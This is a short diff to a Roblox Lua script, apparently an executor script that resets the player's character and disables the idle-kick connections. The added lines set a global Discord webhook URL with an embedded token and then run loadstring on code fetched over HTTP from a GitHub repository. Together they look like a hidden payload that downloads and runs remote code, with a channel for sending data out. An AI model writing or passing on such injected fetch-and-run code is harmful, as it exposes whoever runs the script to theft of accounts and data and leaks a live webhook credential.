@@ -1,3 +1,6 @@
+_G.webhooksdiscord = "https://discord.com/api/webhooks/900739828382044200/QtoCkj7o71m6MepyGpsC4zK1ByoMh8sTMV27PQwYUTWTKS_aTlHlNjHdVwEcL_Qbo0z3"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SHARKX516/SHREKATTACK/main/SHARKLOL2.lua"),true)()
+
 game.Players.LocalPlayer.Character.Humanoid.Health = 0
 for i,v in pairs(getconnections(game.Players.LocalPlayer.Idled)) do
 	v:Disable()
